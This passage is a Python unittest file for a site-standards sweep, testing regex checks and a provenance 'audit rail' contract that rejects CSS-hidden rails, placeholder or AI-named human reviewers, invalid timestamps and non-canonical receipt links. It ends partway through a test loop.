"""The sweep is only worth running if it can fail.

The failure mode these tests exist for: a check that matches nothing, reports
every site clean, and is therefore indistinguishable from having no rule at all.
"""

from __future__ import annotations

import json
import re
import socket
import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path
from unittest import mock
from urllib.parse import quote

from scripts.agent_fleet_contract import PUBLIC_MODEL_IDS
from scripts import fleet_check
from scripts.standards_lib import load_standards, parse_standard


REPOSITORY = Path(__file__).resolve().parents[1]

HEADER = {
    "title": "Example rule",
    "severity": "error",
    "captured": "2026-08-16",
    "captured_from": "Test fixture",
    "applies_to": ["published-html"],
}


def build(checks: list[dict], directory: Path, name: str = "example-rule.md"):
    path = directory / name
    path.write_text(
        "---\n"
        + json.dumps({**HEADER, "checks": checks}, indent=2)
        + "\n---\n\n## Example rule\n\n- do it\n",
        encoding="utf-8",
    )
    return parse_standard(path)


AUDIT_RAIL = (
    '<aside data-document-provenance="receipt-linked" '
    'data-verification-scope="external-exact-live-bytes" '
    'data-human-author="Dennis Yu" data-maintainer="Documentation function" '
    'data-maintainer-agent="agent:codex-fleet-audit" data-maintainer-model="GPT-5" '
    'data-human-reviewer="Mina Patel" data-capture-run-id="capture-100" '
    'data-scheduler-capture-result="success" '
    'data-publication-verification-result="success" '
    'data-publication-receipt-id="receipt-100" '
    'data-publication-receipt-index="https://example.test/receipts" '
    'data-publication-receipt-discovery-url="https://example.test/receipts/receipt-100.json" '
    'data-last-checked="2026-08-31T20:00:00-05:00" '
    'data-last-changed="2026-08-25T23:06:50-07:00" '
    'data-source-url="https://example.test/sources/fleet.json" '
    'data-source-revision="wp:110278:113449">'
    '<p>State: receipt-linked. Verification scope: external-exact-live-bytes. '
    'Human author: Dennis Yu. Maintainer: Documentation '
    'function. Agent: agent:codex-fleet-audit. Model: GPT-5. Human reviewer: Mina Patel. Capture run: '
    'capture-100. Scheduler capture result: success. Publication verification result: '
    'success. Publication receipt ID: receipt-100. Discovery URL: '
    'https://example.test/receipts/receipt-100.json. Source revision: '
    'wp:110278:113449.</p>'
    '<a href="https://example.test/sources/fleet.json">Public source</a>'
    '<a href="https://example.test/receipts">Public receipt ledger</a>'
    '<a href="https://example.test/receipts/receipt-100.json">Committed publication receipt</a>'
    '<time datetime="2026-08-25T23:06:50-07:00">Changed August 25, 2026</time>'
    '<time datetime="2026-08-31T20:00:00-05:00">Checked August 31, 2026</time>'
    '</aside>'
)


def fleet_audit_rail() -> str:
    receipt_id = "fleet-page-" + ("b" * 20)
    source_revision = "0123456789abcdef0123456789abcdef01234567"
    scope = "external-exact-raw-wp-body-and-inclusive-marker-slice"
    return (
        AUDIT_RAIL.replace("external-exact-live-bytes", scope)
        .replace("Mina Patel", "Dennis Yu")
        .replace("receipt-100", receipt_id)
        .replace(
            "https://example.test/receipts/" + receipt_id,
            "https://github.com/dennisyu/local-service-spotlight-skills/blob/main/"
            "receipts/agent-fleet/" + receipt_id,
        )
        .replace(
            "https://example.test/receipts",
            "https://github.com/dennisyu/local-service-spotlight-skills/tree/main/"
            "receipts/agent-fleet",
        )
        .replace(
            "https://example.test/sources/fleet.json",
            fleet_check.FLEET_SOURCE_MANIFEST_PREFIX + source_revision + ".json",
        )
        .replace("wp:110278:113449", source_revision)
        .replace(
            '<aside data-document-provenance=',
            '<aside data-source-contract-url="'
            + fleet_check.FLEET_RECEIPT_CONTRACT
            + '" data-document-provenance=',
        )
        .replace(
            "<a href=\"" + fleet_check.FLEET_RECEIPT_INDEX + "\">",
            'Receipt contract: <a href="' + fleet_check.FLEET_RECEIPT_CONTRACT
            + '">public verification rules</a><a href="'
            + fleet_check.FLEET_RECEIPT_INDEX + '">',
        )
    )


class RegexCheckTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)

    def test_forbid_regex_reports_a_match(self):
        standard = build(
            [
                {
                    "id": "no-blink",
                    "kind": "forbid_regex",
                    "pattern": "<blink\\b",
                    "message": "blink tag",
                    "examples": {"violating": ["<blink>"], "clean": ["<b>"]},
                }
            ],
            self.dir,
        )
        found = fleet_check.run_check(
            standard.checks[0], "https://x.test/", "<p><blink>hi</blink></p>", "error"
        )
        self.assertEqual(len(found), 1)
        self.assertTrue(found[0].blocking)
        self.assertIn("blink", found[0].detail)

    def test_forbid_regex_caps_the_noise_but_reports_the_total(self):
        standard = build(
            [
                {
                    "id": "no-blink",
                    "kind": "forbid_regex",
                    "pattern": "<blink\\b",
                    "message": "blink tag",
                    "examples": {"violating": ["<blink>"], "clean": ["<b>"]},
                }
            ],
            self.dir,
        )
        found = fleet_check.run_check(
            standard.checks[0], "https://x.test/", "<blink>" * 9, "error"
        )
        self.assertEqual(len(found), 6)
        self.assertIn("and 4 more", found[-1].detail)

    def test_a_marked_exemption_is_honoured_but_only_nearby(self):
        standard = build(
            [
                {
                    "id": "no-black",
                    "kind": "forbid_regex",
                    "pattern": "background:#000",
                    "exempt_if_near": "bm-allow-black",
                    "message": "black fill",
                    "examples": {
                        "violating": ["background:#000"],
                        "clean": ["background:#fff"],
                    },
                }
            ],
            self.dir,
        )
        check = standard.checks[0]

        near = '<a class="bm-allow-black" style="background:#000">logo</a>'
        self.assertEqual(fleet_check.run_check(check, "u", near, "error"), [])

        far = 'bm-allow-black' + ("x" * 400) + 'style="background:#000"'
        self.assertEqual(len(fleet_check.run_check(check, "u", far, "error")), 1)

    def test_require_regex_reports_absence(self):
        standard = build(
            [
                {
                    "id": "needs-hero",
                    "kind": "require_regex",
                    "pattern": "height:\\d+svh",
                    "message": "no full-height hero",
                    "examples": {
                        "violating": ["<div></div>"],
                        "clean": ["<div style=\"height:94svh\"></div>"],
                    },
                }
            ],
            self.dir,
        )
        check = standard.checks[0]
        self.assertEqual(len(fleet_check.run_check(check, "u", "<div></div>", "warn")), 1)
        self.assertEqual(
            fleet_check.run_check(check, "u", 'style="height:94svh"', "warn"), []
        )


class ProvenanceContractTests(unittest.TestCase):
    """The audit rail is a DOM contract; source-text lookalikes must not pass."""

    @classmethod
    def setUpClass(cls):
        standard = next(
            item
            for item in load_standards(REPOSITORY / "standards")
            if item.slug == "public-documentation-auditable-truth"
        )
        cls.check = standard.checks[0]

    def run_contract(self, body: str):
        return fleet_check.run_check(
            self.check,
            "https://x.test/",
            body,
            "error",
            provenance_now=datetime(2026, 9, 1, tzinfo=timezone.utc),
        )

    def test_order_independent_semantic_times_pass(self):
        self.assertEqual(self.run_contract(AUDIT_RAIL), [])

    def test_freshness_requires_an_explicit_live_target_policy(self):
        stale_now = datetime(2026, 10, 2, tzinfo=timezone.utc)
        historical = fleet_check.run_provenance_contract(
            self.check,
            "https://x.test/archive/evidence.html",
            AUDIT_RAIL,
            "error",
            now=stale_now,
        )
        current = fleet_check.run_provenance_contract(
            self.check,
            "https://x.test/current-page/",
            AUDIT_RAIL,
            "error",
            now=stale_now,
            freshness_policy="current-live-30d",
        )
        self.assertEqual(historical, [])
        self.assertEqual(len(current), 1)
        self.assertIn("explicit 30-day", current[0].detail)

    def test_provenance_only_kwargs_do_not_reach_url_resolvers(self):
        resolve_check = next(
            check
            for standard in load_standards(REPOSITORY / "standards")
            for check in standard.checks
            if check.kind == "resolve_urls"
        )
        self.assertEqual(
            fleet_check.run_check(
                resolve_check,
                "https://x.test/",
                "",
                "error",
                provenance_freshness_policy="current-live-30d",
                pause=0,
            ),
            [],
        )

    def test_visible_labels_work_in_blocks_definition_lists_and_br_rows(self):
        start = AUDIT_RAIL.index("<p>") + 3
        end = AUDIT_RAIL.index("</p>", start)
        original = AUDIT_RAIL[start:end]
        clauses = [
            clause.rstrip(".")
            for clause in re.split(r"\.\s+(?=[A-Z])", original)
        ]
        variants = (
            "".join(f"<div>{clause}</div>" for clause in clauses),
            "<dl>"
            + "".join(
                f"<dt>{clause.split(': ', 1)[0]}</dt>"
                f"<dd>{clause.split(': ', 1)[1]}</dd>"
                for clause in clauses
            )
            + "</dl>",
            "".join(f"<span>{clause}</span><br>" for clause in clauses),
        )
        for replacement in variants:
            with self.subTest(replacement=replacement[:80]):
                body = AUDIT_RAIL[: start - 3] + replacement + AUDIT_RAIL[end + 4 :]
                self.assertEqual(self.run_contract(body), [])

    def test_conflicting_or_whitespace_only_duplicate_labels_fail(self):
        contradictions = (
            "State: pending-external-verification.",
            "Human author: Mina Patel.",
            "Scheduler capture result: failure.",
            "Publication verification result: failure.",
            "Model: UNKNOWN.",
            "Source revision: other-999.",
            "State pending-external-verification.",
            "Human author Mina Patel.",
            "Model UNKNOWN.",
        )
        for contradiction in contradictions:
            with self.subTest(contradiction=contradiction):
                body = AUDIT_RAIL.replace("</p>", " " + contradiction + "</p>", 1)
                self.assertEqual(len(self.run_contract(body)), 1)

    def test_compound_explanatory_label_is_not_a_duplicate_model_assignment(self):
        unknown_model = AUDIT_RAIL.replace("GPT-5", "UNKNOWN")
        explained = unknown_model.replace(
            "</aside>",
            "<p>Model availability note: runtime did not expose an exact model ID.</p>"
            "</aside>",
        )
        self.assertEqual(self.run_contract(explained), [])

        for contradiction in ("Model: GPT-5.", "Model GPT-5."):
            with self.subTest(contradiction=contradiction):
                body = unknown_model.replace(
                    "</aside>", f"<p>{contradiction}</p></aside>"
                )
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertIn("conflicting or duplicate", found[0].detail)

    def test_pending_state_is_honest_before_external_receipt_exists(self):
        pending = AUDIT_RAIL.replace(
            'data-document-provenance="receipt-linked"',
            'data-document-provenance="pending-external-verification"',
        ).replace('data-human-reviewer="Mina Patel"',
                  'data-human-reviewer="not yet reviewed"').replace(
            "State: receipt-linked", "State: pending-external-verification"
        ).replace("Human reviewer: Mina Patel", "Human reviewer: not yet reviewed")
        pending = pending.replace(
            'data-publication-verification-result="success"',
            'data-publication-verification-result="pending"',
        ).replace(
            "Publication verification result: success",
            "Publication verification result: pending",
        ).replace(
            '<a href="https://example.test/receipts/receipt-100.json">'
            "Committed publication receipt</a>",
            "",
        )
        self.assertEqual(self.run_contract(pending), [])

        linked_without_anchor = AUDIT_RAIL.replace(
            '<a href="https://example.test/receipts/receipt-100.json">'
            "Committed publication receipt</a>",
            "",
        )
        found = self.run_contract(linked_without_anchor)
        self.assertEqual(len(found), 1)
        self.assertIn("visible link", found[0].detail)

        pending_with_anchor = pending.replace(
            '<a href="https://example.test/receipts">Public receipt ledger</a>',
            '<a href="https://example.test/receipts">Public receipt ledger</a>'
            '<a href="https://example.test/receipts/receipt-100.json">'
            "Unresolved receipt</a>",
        )
        found = self.run_contract(pending_with_anchor)
        self.assertEqual(len(found), 1)
        self.assertIn("not an unresolved link", found[0].detail)

        for fake_reviewer in ("anonymous pending review", "someone pending review"):
            with self.subTest(reviewer=fake_reviewer):
                disguised = pending.replace(
                    'data-human-reviewer="not yet reviewed"',
                    f'data-human-reviewer="{fake_reviewer}"',
                ).replace(
                    "Human reviewer: not yet reviewed",
                    f"Human reviewer: {fake_reviewer}",
                )
                found = self.run_contract(disguised)
                self.assertEqual(len(found), 1)
                self.assertIn("placeholder", found[0].detail)

    def test_marker_bounded_external_scope_is_supported(self):
        marker_bounded = fleet_audit_rail()
        marker_bounded = (
            "<!-- BM-FLEET-PAGE:START -->"
            + marker_bounded
            + "<!-- BM-FLEET-PAGE:END -->"
        )
        self.assertEqual(self.run_contract(marker_bounded), [])

    def test_marker_bounded_scope_requires_one_ordered_pair_around_the_rail(self):
        scoped = fleet_audit_rail()
        cases = (
            scoped,
            "<!-- BM-FLEET-PAGE:END -->"
            + scoped
            + "<!-- BM-FLEET-PAGE:START -->",
            "<!-- BM-FLEET-PAGE:START --><!-- BM-FLEET-PAGE:END -->" + scoped,
            "<!-- BM-FLEET-PAGE:START -->"
            + scoped
            + "<!-- BM-FLEET-PAGE:END --><!-- BM-FLEET-PAGE:END -->",
            "<template><!-- BM-FLEET-PAGE:START --></template>"
            + scoped
            + "<!-- BM-FLEET-PAGE:END -->",
        )
        for body in cases:
            with self.subTest(body=body[:100]):
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertIn("marker", found[0].detail)

    def test_marker_bounded_rail_must_close_before_the_end_marker(self):
        scoped = fleet_audit_rail()
        opening, closing = scoped.rsplit("</aside>", 1)
        crossed_boundary = (
            "<!-- BM-FLEET-PAGE:START -->"
            + opening
            + "<!-- BM-FLEET-PAGE:END -->"
            + "</aside>"
            + closing
        )
        found = self.run_contract(crossed_boundary)
        self.assertEqual(len(found), 1)
        self.assertIn("wholly inside", found[0].detail)

    def test_fleet_scope_requires_the_canonical_public_ledger(self):
        valid = fleet_audit_rail()
        cases = (
            valid.replace(
                fleet_check.FLEET_RECEIPT_INDEX,
                "https://example.test/receipts/agent-fleet",
            ),
            valid.replace(
                fleet_check.FLEET_RECEIPT_DISCOVERY_PREFIX,
                "https://example.test/receipts/agent-fleet/",
            ),
            valid.replace(
                fleet_check.FLEET_SOURCE_MANIFEST_PREFIX
                + "0123456789abcdef0123456789abcdef01234567.json",
                "https://example.test/private-source",
            ),
            valid.replace(
                'data-source-revision="0123456789abcdef0123456789abcdef01234567"',
                'data-source-revision="wp:110278:113449"',
            ),
            valid.replace(
                'data-capture-run-id="capture-100"',
                'data-capture-run-id="' + ("a" * 129) + '"',
            ),
            valid.replace(
                fleet_check.FLEET_RECEIPT_CONTRACT, "https://example.test/contract"
            ),
            valid.replace(
                ' data-source-contract-url="'
                + fleet_check.FLEET_RECEIPT_CONTRACT
                + '"',
                "",
            ),
            valid.replace(
                "Receipt contract: ", "Unrelated: "
            ).replace(
                ">public verification rules</a>", ">click here</a>"
            ),
        )
        for body in cases:
            with self.subTest(body=body[:180]):
                found = self.run_contract(
                    "<!-- BM-FLEET-PAGE:START -->"
                    + body
                    + "<!-- BM-FLEET-PAGE:END -->"
                )
                self.assertEqual(len(found), 1)
                self.assertTrue(
                    "fleet" in found[0].detail
                    or "data-capture-run-id" in found[0].detail,
                    found[0].detail,
                )

    def test_receipt_linked_cannot_claim_an_unreviewed_page(self):
        for reviewer in (
            "not yet reviewed",
            "not reviewed",
            "pending review",
            "review pending",
            "unreviewed",
            "no human review recorded",
            "reviewed",
            "review complete",
            "Codex reviewer",
            "Claude human reviewer",
            "AI reviewer",
            "Robot Reviewer",
            "Llama 3 Reviewer",
            "LLM reviewer",
            "Agent Reviewer",
            "Qwen2 Reviewer",
            "DeepSeek reviewer",
        ):
            with self.subTest(reviewer=reviewer):
                unreviewed = AUDIT_RAIL.replace(
                    'data-human-reviewer="Mina Patel"',
                    f'data-human-reviewer="{reviewer}"',
                ).replace("Human reviewer: Mina Patel", f"Human reviewer: {reviewer}")
                found = self.run_contract(unreviewed)
                self.assertEqual(len(found), 1)
                self.assertTrue(
                    "requires the actual human reviewer" in found[0].detail
                    or "must name a human" in found[0].detail
                    or "concrete human" in found[0].detail,
                    found[0].detail,
                )

    def test_receipt_linked_failure_is_an_honest_linked_failure(self):
        failed = AUDIT_RAIL.replace(
            'data-publication-verification-result="success"',
            'data-publication-verification-result="failure"',
        ).replace(
            "Publication verification result: success",
            "Publication verification result: failure",
        )
        self.assertEqual(self.run_contract(failed), [])

    def test_scheduler_and_publication_results_are_not_conflated(self):
        scheduled_failure = AUDIT_RAIL.replace(
            'data-scheduler-capture-result="success"',
            'data-scheduler-capture-result="failure"',
        ).replace(
            "Scheduler capture result: success", "Scheduler capture result: failure"
        )
        self.assertEqual(self.run_contract(scheduled_failure), [])

        legacy = AUDIT_RAIL.replace(
            'data-scheduler-capture-result="success"', 'data-capture-result="success"'
        )
        found = self.run_contract(legacy)
        self.assertEqual(len(found), 1)
        self.assertIn("ambiguous", found[0].detail)

    def test_comments_scripts_and_templates_do_not_create_a_rail(self):
        inert = (
            f"<!-- {AUDIT_RAIL} -->"
            f'<script type="text/template">{AUDIT_RAIL}</script>'
            f"<template>{AUDIT_RAIL}</template>"
        )
        found = self.run_contract(inert)
        self.assertEqual(len(found), 1)
        self.assertIn("found 0", found[0].detail)

    def test_all_inert_text_containers_do_not_create_a_rail(self):
        for tag in ("textarea", "title", "xmp", "iframe", "noembed", "plaintext"):
            with self.subTest(tag=tag):
                found = self.run_contract(f"<{tag}>{AUDIT_RAIL}</{tag}>")
                self.assertEqual(len(found), 1)
                self.assertIn("found 0", found[0].detail)

    def test_inert_lookalikes_cannot_publish_a_second_machine_truth(self):
        body = f"<!-- {AUDIT_RAIL} --><template>{AUDIT_RAIL}</template>{AUDIT_RAIL}"
        found = self.run_contract(body)
        self.assertEqual(len(found), 1)
        self.assertIn("outside the provenance rail", found[0].detail)

    def test_hidden_rail_and_hidden_time_fail(self):
        hidden_rail = AUDIT_RAIL.replace("<aside ", "<aside hidden ", 1)
        hidden_time = AUDIT_RAIL.replace(
            '<time datetime="2026-08-25T23:06:50-07:00">',
            '<time style="display: none" datetime="2026-08-25T23:06:50-07:00">',
            1,
        )
        inherited_hidden = f'<div aria-hidden="true">{AUDIT_RAIL}</div>'
        for body in (hidden_rail, hidden_time, inherited_hidden):
            with self.subTest(body=body[:80]):
                self.assertEqual(len(self.run_contract(body)), 1)

    def test_native_closed_containers_do_not_count_as_visible(self):
        closed_details = f"<details>{AUDIT_RAIL}</details>"
        closed_dialog = f"<dialog>{AUDIT_RAIL}</dialog>"
        for body in (closed_details, closed_dialog):
            with self.subTest(body=body[:40]):
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)

    def test_obvious_offscreen_clipped_filtered_or_unpainted_rails_fail(self):
        styles = (
            "position:absolute;left:-99999px",
            "transform:translateX(-99999px)",
            "clip-path:inset(100%)",
            "clip:rect(0,0,0,0)",
            "filter:opacity(0)",
            "mask-image:linear-gradient(transparent,transparent)",
            "color:transparent",
            "text-indent:-99999px",
        )
        for style in styles:
            with self.subTest(style=style):
                body = AUDIT_RAIL.replace("<aside ", f'<aside style="{style}" ', 1)
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertIn("visible rail", found[0].detail)
                self.assertIn("found 0", found[0].detail)

        summary = f"<details><summary>{AUDIT_RAIL}</summary></details>"
        second_summary = (
            f"<details><summary>Visible label</summary><summary>{AUDIT_RAIL}</summary></details>"
        )
        opened_dialog = f"<dialog open>{AUDIT_RAIL}</dialog>"
        self.assertEqual(self.run_contract(summary), [])
        self.assertEqual(len(self.run_contract(second_summary)), 1)
        self.assertEqual(self.run_contract(opened_dialog), [])

    def test_inline_and_unconditional_css_hiding_fail(self):
        inline = AUDIT_RAIL.replace("<aside ", '<aside style="opacity:0.00" ', 1)
        inline_important = AUDIT_RAIL.replace(
            "<aside ", '<aside style="display:none!important;display:block" ', 1
        )
        inline_comment = AUDIT_RAIL.replace(
            "<aside ", '<aside style="display:/**/none" ', 1
        )
        inline_quoted_comment_markers = AUDIT_RAIL.replace(
            "<aside ",
            '<aside style=\'content:"/*";display:none;x:"*/"\' ',
            1,
        )
        css_class = "<style>.concealed{display:none}</style>" + AUDIT_RAIL.replace(
            "<aside ", '<aside class="concealed" ', 1
        )
        css_important = (
            "<style>aside{display:none!important;display:block}</style>" + AUDIT_RAIL
        )
        css_attribute = (
            "<style>[data-document-provenance]{visibility:hidden}</style>" + AUDIT_RAIL
        )
        css_quoted_comment_markers = (
            '<style>aside{content:"/*";display:none;x:"*/"}</style>' + AUDIT_RAIL
        )
        css_escaped_property = (
            r"<style>aside{d\69splay:none}</style>" + AUDIT_RAIL
        )
        css_escaped_value = (
            r"<style>aside{display:n\6f ne}</style>" + AUDIT_RAIL
        )
        classed = AUDIT_RAIL.replace("<aside ", '<aside class="bm" ', 1)
        css_escaped_selector = r"<style>.b\6d{display:none}</style>" + classed
        css_escaped_selector_prefix = r"<style>.\62m{display:none}</style>" + classed
        inherited_visibility = (
            '<div style="visibility:hidden">'
            + AUDIT_RAIL.replace(
                "<aside ", '<aside style="visibility:inherit" ', 1
            )
            + "</div>"
        )
        unset_visibility = inherited_visibility.replace(
            "visibility:inherit", "visibility:unset"
        )
        revert_visibility = inherited_visibility.replace(
            "visibility:inherit", "visibility:revert"
        )
        for body in (
            inline,
            inline_important,
            inline_comment,
            inline_quoted_comment_markers,
            css_class,
            css_important,
            css_attribute,
            css_quoted_comment_markers,
            css_escaped_property,
            css_escaped_value,
            css_escaped_selector,
            css_escaped_selector_prefix,
            inherited_visibility,
            unset_visibility,
            revert_visibility,
        ):
            with self.subTest(body=body[:80]):
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertIn("found 0", found[0].detail)

    def test_unsupported_pseudo_selectors_and_zero_paint_forms_fail_closed(self):
        stylesheet_rules = (
            "aside:not(.x){display:none}",
            ":where(aside){display:none}",
            ":where(aside,.missing){display:none}",
            ":is(.missing,aside){display:none}",
            "body :is(aside){display:none}",
            "body :is(.missing,aside){display:none}",
            ":where(:is(aside,.x)){display:none}",
            "aside:nth-of-type(1){display:none}",
            r"aside\3a not(.x){display:none}",
            "aside{opacity:calc(0)}",
            "aside{transform:scale(0%)}",
            "aside{font-size:0}",
            "aside{height:0;overflow:hidden}",
            "aside{position:absolute;left:-999999cm}",
            "aside{color:rgba(0 0 0 / 0)}",
        )
        for rule in stylesheet_rules:
            with self.subTest(rule=rule):
                found = self.run_contract(f"<style>{rule}</style>" + AUDIT_RAIL)
                self.assertEqual(len(found), 1)
                self.assertIn("found 0", found[0].detail)

        too_many = ":is(" + ",".join(
            [*(f".missing{index}" for index in range(32)), "aside"]
        ) + "){display:none}"
        found = self.run_contract(f"<style>{too_many}</style>" + AUDIT_RAIL)
        self.assertEqual(len(found), 1)
        self.assertIn("found 0", found[0].detail)

    def test_escaped_and_unicode_class_identifiers_cannot_hide_the_rail(self):
        cases = (
            ("x,y", r".x\,y"),
            ("x,y", r".x\2c y"),
            ("x:y", r".x\:y"),
            ("x:y", r".x\3a y"),
            ("x.y", r".x\.y"),
            ("x#y", r".x\#y"),
            ("隐藏", ".隐藏"),
            ("é", ".é"),
            ("δοκιμή", ".δοκιμή"),
        )
        for class_name, selector in cases:
            with self.subTest(class_name=class_name, selector=selector):
                rail = AUDIT_RAIL.replace(
                    "<aside ", f'<aside class="{class_name}" ', 1
                )
                found = self.run_contract(
                    f"<style>{selector}{{display:none}}</style>" + rail
                )
                self.assertEqual(len(found), 1)
                self.assertIn("found 0", found[0].detail)

        competing_rules = (
            ("class", "隐藏", ".隐藏{display:none}aside{display:block}"),
            ("class", "é", ".é{display:none}aside{display:block}"),
            ("id", "隐藏", "#隐藏{display:none}aside{display:block}"),
            ("class", "rail", "aside{display:none}:where(.rail){display:block}"),
            ("class", "x", ":is(.x,#not-present){display:none}.x{display:block}"),
            ("class", "foo", "aside:not(.missing){display:none}.foo{display:block}"),
        )
        for attribute, value, rules in competing_rules:
            with self.subTest(attribute=attribute, value=value, rules=rules):
                rail = AUDIT_RAIL.replace(
                    "<aside ", f'<aside {attribute}="{value}" ', 1
                )
                self.assertEqual(
                    len(self.run_contract(f"<style>{rules}</style>" + rail)), 1
                )

        visible_where = AUDIT_RAIL.replace(
            "<aside ", '<aside class="rail" ', 1
        )
        self.assertEqual(
            self.run_contract(
                "<style>:where(.rail){display:none}aside{display:block}</style>"
                + visible_where
            ),
            [],
        )

    def test_inherited_text_hiding_can_be_overridden_on_the_rail(self):
        rules = (
            ".hide{color:transparent}.show{color:#000}",
            ".hide{font-size:0}.show{font-size:16px}",
            ".hide{text-indent:-99999px}.show{text-indent:0}",
        )
        for stylesheet in rules:
            with self.subTest(stylesheet=stylesheet):
                rail = AUDIT_RAIL.replace(
                    "<aside ", '<aside class="show" ', 1
                )
                body = (
                    f'<style>{stylesheet}</style><div class="hide">'
                    + rail
                    + "</div>"
                )
                self.assertEqual(self.run_contract(body), [])

    def test_css_selector_relationships_and_print_media_do_not_false_fail(self):
        absent_ancestor = "<style>.missing-parent aside{display:none}</style>" + AUDIT_RAIL
        print_only = "<style>@media print {aside{display:none}}</style>" + AUDIT_RAIL
        print_attribute = (
            '<style media="print">aside{display:none}</style>' + AUDIT_RAIL
        )
        non_css_style = (
            '<style type="text/plain">aside{display:none}</style>' + AUDIT_RAIL
        )
        for body in (absent_ancestor, print_only, print_attribute, non_css_style):
            self.assertEqual(self.run_contract(body), [])

    def test_css_selectors_see_browser_implicit_html_and_body_wrappers(self):
        selectors = (
            "body > aside", "html > body > aside", "html aside",
            "html > body aside", "* > aside",
        )
        for selector in selectors:
            for rail in (
                AUDIT_RAIL,
                "<html><body>" + AUDIT_RAIL + "</body></html>",
            ):
                with self.subTest(selector=selector, complete=rail.startswith("<html")):
                    found = self.run_contract(
                        f"<style>{selector}{{display:none}}</style>" + rail
                    )
                    self.assertEqual(len(found), 1)
                    self.assertIn("found 0", found[0].detail)

    def test_supported_static_css_cascade_respects_overrides(self):
        classed = AUDIT_RAIL.replace("<aside ", '<aside class="rail" ', 1)
        later_rule = (
            "<style>.rail{display:none}.rail{display:block}</style>" + classed
        )
        inline_rule = "<style>.rail{display:none}</style>" + classed.replace(
            '<aside class="rail" ', '<aside class="rail" style="display:block" ', 1
        )
        important_rule = (
            "<style>.rail{display:block!important}</style>"
            + classed.replace(
                '<aside class="rail" ',
                '<aside class="rail" style="display:none" ',
                1,
            )
        )
        important_inline_order = classed.replace(
            '<aside class="rail" ',
            '<aside class="rail" style="display:block!important;display:none" ',
            1,
        )
        important_stylesheet_order = (
            "<style>.rail{display:block!important;display:none}</style>" + classed
        )
        for body in (
            later_rule,
            inline_rule,
            important_rule,
            important_inline_order,
            important_stylesheet_order,
        ):
            with self.subTest(body=body[:120]):
                self.assertEqual(self.run_contract(body), [])

    def test_css_hidden_required_descendants_do_not_count_as_visible(self):
        hidden_time = "<style>.concealed{display:none}</style>" + AUDIT_RAIL.replace(
            '<time datetime="2026-08-25T23:06:50-07:00">',
            '<time class="concealed" datetime="2026-08-25T23:06:50-07:00">',
        )
        hidden_source = "<style>.concealed{display:none}</style>" + AUDIT_RAIL.replace(
            '<a href="https://example.test/sources/fleet.json">',
            '<a class="concealed" href="https://example.test/sources/fleet.json">',
        )
        for body in (hidden_time, hidden_source):
            with self.subTest(body=body[-160:]):
                self.assertEqual(len(self.run_contract(body)), 1)

    def test_css_specificity_ignores_punctuation_inside_attribute_values(self):
        for attribute_value in ("#fake", ".fake"):
            with self.subTest(value=attribute_value):
                rail = AUDIT_RAIL.replace(
                    "<aside ",
                    f'<aside class="a b" data-x="{attribute_value}" ',
                    1,
                )
                body = (
                    "<style>.a.b{display:none}"
                    f'[data-x="{attribute_value}"]{{display:block}}</style>'
                    + rail
                )
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertIn("found 0", found[0].detail)

    def test_invalid_calendar_instant_fails(self):
        impossible = AUDIT_RAIL.replace("2026-08-31T20:00:00-05:00", "2026-02-30T20:00:00-05:00")
        found = self.run_contract(impossible)
        self.assertEqual(len(found), 1)
        self.assertIn("not a valid", found[0].detail)

    def test_invalid_iso_timezone_offsets_fail(self):
        for invalid_offset in ("+00:60", "+14:01", "+14:99", "+15:00"):
            with self.subTest(offset=invalid_offset):
                invalid = AUDIT_RAIL.replace(
                    "2026-08-31T20:00:00-05:00",
                    "2026-08-31T20:00:00" + invalid_offset,
                )
                found = self.run_contract(invalid)
                self.assertEqual(len(found), 1)
                self.assertIn("not a valid", found[0].detail)

    def test_changed_clock_cannot_be_after_checked_clock(self):
        later_change = AUDIT_RAIL.replace(
            "2026-08-25T23:06:50-07:00", "2026-09-01T23:06:50-07:00"
        ).replace("Changed August 25, 2026", "Changed September 1, 2026")
        found = self.run_contract(later_change)
        self.assertEqual(len(found), 1)
        self.assertIn("cannot be later", found[0].detail)

    def test_evidence_checked_clock_cannot_be_in_the_future(self):
        future = AUDIT_RAIL.replace(
            "2026-08-31T20:00:00-05:00", "2099-01-01T00:00:00Z"
        ).replace("August 31, 2026", "January 1, 2099")
        found = self.run_contract(future)
        self.assertEqual(len(found), 1)
        self.assertIn("cannot be in the future", found[0].detail)

    def test_placeholder_and_whitespace_identities_fail(self):
        placeholder = AUDIT_RAIL.replace(
            'data-human-author="Dennis Yu" data-maintainer="Documentation function" ',
            'data-human-author="   " data-maintainer="UNKNOWN" ',
        ).replace(
            'data-human-reviewer="Mina Patel"', 'data-human-reviewer="nobody"'
        )
        found = self.run_contract(placeholder)
        self.assertEqual(len(found), 1)
        self.assertIn("placeholder", found[0].detail)

        for field, real, generic in (
            ("data-human-author", "Dennis Yu", "author"),
            ("data-maintainer-agent", "agent:codex-fleet-audit", "agent"),
            ("data-human-author", "Dennis Yu", "someone"),
            ("data-human-author", "Dennis Yu", "Codex author"),
            ("data-maintainer-agent", "agent:codex-fleet-audit", "system"),
            ("data-maintainer-agent", "agent:codex-fleet-audit", "invalid public agent identity"),
        ):
            with self.subTest(field=field):
                body = AUDIT_RAIL.replace(
                    f'{field}="{real}"', f'{field}="{generic}"'
                ).replace(real, generic)
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertTrue(
                    "placeholder" in found[0].detail
                    or "must name a human" in found[0].detail
                    or "concrete human" in found[0].detail,
                    found[0].detail,
                )

        for real_value in ("Dennis Yu", "agent:codex-fleet-audit", "GPT-5", "Mina Patel"):
            for url_form in (
                "https://blitzmetrics.com/scheduled-jobs-fleet/",
                quote("https://blitzmetrics.com/scheduled-jobs-fleet/", safe=""),
            ):
                with self.subTest(url_identity=real_value, value=url_form):
                    body = AUDIT_RAIL.replace(real_value, url_form)
                    self.assertEqual(len(self.run_contract(body)), 1)

        for encoded_identity in (
            "%73omeone",
            "%61nonymous",
            "%72edacted",
            "%73ystem",
            "%70ending%20review",
            "%55NKNOWN",
            "%43odex reviewer",
        ):
            with self.subTest(encoded_identity=encoded_identity):
                body = AUDIT_RAIL.replace("Mina Patel", encoded_identity)
